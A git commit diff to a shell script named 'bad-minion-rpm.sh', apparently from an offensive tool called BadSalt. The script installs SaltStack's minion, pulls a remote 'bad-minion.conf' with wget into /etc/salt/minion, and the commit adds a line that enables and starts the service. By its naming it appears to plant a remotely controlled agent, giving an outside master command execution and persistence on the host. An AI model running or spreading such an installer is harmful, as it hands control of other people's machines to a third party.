5da74eebe57e51df24ecea5d8c5bbe384c0f81e7
Casey Erdmann <14339392+3ndG4me@users.noreply.github.com>
2019-02-05 16:37:04 -0500

    Update bad-minion-rpm.sh

--- bad-minion-rpm.sh
+++ bad-minion-rpm.sh
@@ -2,3 +2,4 @@
 sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest.el7.noarch.rpm
 sudo yum install salt-minion
 wget -O - https://raw.githubusercontent.com/3ndG4me/BadSalt/master/bad-minion.conf > /etc/salt/minion
+sudo systemctl enable salt-minion --now
